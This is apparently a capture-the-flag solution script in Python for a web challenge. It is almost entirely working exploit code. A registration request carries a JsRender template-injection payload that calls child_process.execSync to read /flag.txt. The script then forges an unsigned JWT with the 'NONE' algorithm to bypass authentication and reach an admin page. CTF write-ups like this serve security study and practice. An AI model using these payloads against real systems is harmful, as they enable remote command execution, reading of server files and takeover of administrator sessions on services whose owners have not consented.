#!/usr/bin/python3
import requests
import re
import base64

url = "http://144.126.196.198:32160/"

# https://appcheck-ng.com/template-injection-jsrender-jsviews
creds = {"username":"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}","password":"jadu"}


register = requests.post(url + "register", json=creds)

#print(register.status_code)

#login = requests.post(url + "login", json=creds)

#cookie = login.headers["Set-Cookie"].split(';')[0].split('=')[-1]

#print(cookie)
#decoded_token = jwt.decode(cookie, algorithms=["HS256"], verify=False)

# bypass the check == 'none' which in this case is false as there is not strict comparision
headers = '{"alg": "NONE", "typ": "JWT"}'

# 1 for admin # some time in future

payload = '{"id": "1", "iat": 1679254708, "exp": 1923252308}'

token = base64.b64encode(headers.encode()).decode().replace('=', '') + '.' + base64.b64encode(payload.encode()).decode().replace('=', '') + '.' 
#print(token)

admin = requests.get(url + "admin", headers={"Cookie": f"session={token}"})

#print(admin.text)

flag = re.findall("HTB{.*", admin.text)[0]

print(flag)
